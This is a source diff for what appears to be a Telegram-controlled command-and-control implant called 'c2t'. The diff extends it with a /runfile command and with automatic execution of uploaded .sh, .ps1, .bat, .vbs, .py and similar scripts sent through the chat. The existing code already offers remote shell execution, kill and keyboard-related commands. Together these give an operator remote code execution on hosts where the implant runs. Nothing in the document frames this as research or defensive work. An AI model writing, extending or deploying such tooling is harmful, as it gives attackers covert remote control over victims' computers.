@@ -221,6 +221,7 @@ typedef enum {
   CMD_INFO,
   CMD_KILL,
   CMD_SHELL,
+  CMD_RUNFILE,
   CMD_HELP
 } c2t_cmd_id_t;
 
@@ -283,7 +284,8 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"status", CMD_STATUS}, {"ping", CMD_STATUS},
   {"info", CMD_INFO}, {"sysinfo", CMD_INFO}, {"about", CMD_INFO}, {"start", CMD_INFO},
   {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
-  {"sh", CMD_SHELL}, {"shell", CMD_SHELL}, {"cmd", CMD_SHELL}, {"exec", CMD_SHELL}, {"terminal", CMD_SHELL}, {"bash", CMD_SHELL}, {"powershell", CMD_SHELL}, {"ps", CMD_SHELL}, {"run_cmd", CMD_SHELL},
+  {"sh", CMD_SHELL}, {"shell", CMD_SHELL}, {"cmd", CMD_SHELL}, {"exec", CMD_SHELL}, {"terminal", CMD_SHELL}, {"bash", CMD_SHELL}, {"powershell", CMD_SHELL}, {"ps", CMD_SHELL}, {"run_cmd", CMD_SHELL}, {"run", CMD_SHELL},
+  {"runfile", CMD_RUNFILE}, {"execfile", CMD_RUNFILE}, {"runscript", CMD_RUNFILE}, {"exec_file", CMD_RUNFILE}, {"run_file", CMD_RUNFILE}, {"script", CMD_RUNFILE},
   {"help", CMD_HELP}
 };
 
@@ -1546,6 +1548,45 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_RUNFILE: {
+    const char *arg = get_command_argument(text);
+    if (!arg || !*arg) {
+      telegram_send_html(
+          "⚠️ <b>Usage:</b> <code>/runfile &lt;filepath&gt; [arguments]</code>\n"
+          "<i>Execute an existing script on the host system.</i>\n\n"
+          "💡 <i>To upload and run a new script, simply send the script file in this chat with caption <code>/run</code>.</i>");
+    } else {
+      char path[512] = {};
+      const char *args = nullptr;
+      while (*arg && isspace((unsigned char)*arg))
+        arg++;
+      if (*arg == '"' || *arg == '\'') {
+        char quote = *arg++;
+        size_t idx = 0;
+        while (*arg && *arg != quote && idx + 1 < sizeof(path)) {
+          path[idx++] = *arg++;
+        }
+        path[idx] = '\0';
+        if (*arg == quote)
+          arg++;
+        while (isspace((unsigned char)*arg))
+          arg++;
+        args = *arg ? arg : nullptr;
+      } else {
+        size_t idx = 0;
+        while (*arg && !isspace((unsigned char)*arg) && idx + 1 < sizeof(path)) {
+          path[idx++] = *arg++;
+        }
+        path[idx] = '\0';
+        while (isspace((unsigned char)*arg))
+          arg++;
+        args = *arg ? arg : nullptr;
+      }
+      (void)c2t_shell_run_script_file_and_send(path, args);
+    }
+    break;
+  }
+
   case CMD_LOGS: {
     c2t_log_info("listener", "Flushing logs on-demand by /logs command");
     c2t_log_sender_dispatch_now();
@@ -2190,8 +2231,10 @@ static void handle_command(const telegram_incoming_update_t *update,
     }
 
     static const char shell_sec[] =
-        "<b>Shell Execution:</b>\n"
-        "• <code>/sh &lt;command&gt;</code> (or <code>/cmd</code>, <code>/exec</code>, <code>/shell</code>) - Execute OS command\n\n";
+        "<b>Shell &amp; Script Execution:</b>\n"
+        "• <code>/sh &lt;command&gt;</code> (or <code>/cmd</code>, <code>/exec</code>, <code>/run</code>) - Execute shell command\n"
+        "• <code>/runfile &lt;path&gt; [args]</code> (or <code>/script</code>) - Execute local script file on host\n"
+        "• <b>Script Upload:</b> Send any script file (<code>.sh</code>, <code>.bat</code>, <code>.ps1</code>, <code>.py</code>) as document with caption <code>/run</code> to execute it\n\n";
     if (h_off + sizeof(shell_sec) - 1 < sizeof(help_msg)) {
       memcpy(help_msg + h_off, shell_sec, sizeof(shell_sec) - 1);
       h_off += sizeof(shell_sec) - 1;
@@ -2231,6 +2274,7 @@ static int is_heavy_command(c2t_cmd_id_t cmd) {
   case CMD_FILEINFO:
   case CMD_UPLOAD:
   case CMD_SHELL:
+  case CMD_RUNFILE:
   case CMD_LOGS:
   case CMD_RESTART:
   case CMD_RESTART_KEYBOARD:
@@ -2245,6 +2289,53 @@ static int is_heavy_command(c2t_cmd_id_t cmd) {
   default:
     return 0;
   }
+}
+
+static int is_script_file_extension(const char *name) {
+  if (!name || !*name)
+    return 0;
+  const char *dot = strrchr(name, '.');
+  if (!dot)
+    return 0;
+  if (c2t_strcasecmp(dot, ".sh") == 0 || c2t_strcasecmp(dot, ".bash") == 0 ||
+      c2t_strcasecmp(dot, ".zsh") == 0 || c2t_strcasecmp(dot, ".ps1") == 0 ||
+      c2t_strcasecmp(dot, ".bat") == 0 || c2t_strcasecmp(dot, ".cmd") == 0 ||
+      c2t_strcasecmp(dot, ".py") == 0 || c2t_strcasecmp(dot, ".vbs") == 0 ||
+      c2t_strcasecmp(dot, ".js") == 0 || c2t_strcasecmp(dot, ".pl") == 0 ||
+      c2t_strcasecmp(dot, ".rb") == 0) {
+    return 1;
+  }
+  return 0;
+}
+
+static int is_script_run_caption(const char *caption, const char *file_name) {
+  const char *cap = caption ? caption : "";
+  while (*cap && isspace((unsigned char)*cap))
+    cap++;
+
+  /* If explicitly asking to save or upload, do not execute */
+  if (strncmp(cap, "/upload", 7) == 0 || strncmp(cap, "/put", 4) == 0 ||
+      strncmp(cap, "/save", 5) == 0 || strncmp(cap, "/sendfile", 9) == 0) {
+    return 0;
+  }
+
+  /* If caption starts with an execution command */
+  if (strncmp(cap, "/run", 4) == 0 || strncmp(cap, "/exec", 5) == 0 ||
+      strncmp(cap, "/sh", 3) == 0 || strncmp(cap, "/shell", 6) == 0 ||
+      strncmp(cap, "/cmd", 4) == 0 || strncmp(cap, "/script", 7) == 0 ||
+      strncmp(cap, "/bash", 5) == 0 || strncmp(cap, "/ps", 3) == 0 ||
+      strncmp(cap, "/powershell", 11) == 0 || strncmp(cap, "/py", 3) == 0 ||
+      strncmp(cap, "/python", 7) == 0 || strncmp(cap, "/runscript", 10) == 0 ||
+      strncmp(cap, "/runfile", 8) == 0 || strncmp(cap, "/execfile", 9) == 0) {
+    return 1;
+  }
+
+  /* If caption is empty or whitespace and file is recognized script extension */
+  if (!*cap && is_script_file_extension(file_name)) {
+    return 1;
+  }
+
+  return 0;
 }
 
 #ifdef _WIN32
@@ -2300,6 +2391,15 @@ on_telegram_command_received(const telegram_incoming_update_t *update,
         "listener",
         "Received file attachment (name='%s', file_id=%s) from chat %s",
         update->file_name ? update->file_name : "", update->file_id, chat_id);
+
+    if (is_script_run_caption(update->caption, update->file_name)) {
+      c2t_log_info("listener", "Treating attachment '%s' as script execution",
+                   update->file_name ? update->file_name : "");
+      (void)c2t_shell_run_uploaded_script(update->file_id, update->file_name,
+                                         update->caption);
+      return;
+    }
+
     (void)c2t_file_save_uploaded(update->file_id, update->file_name,
                                  update->caption);
     return;
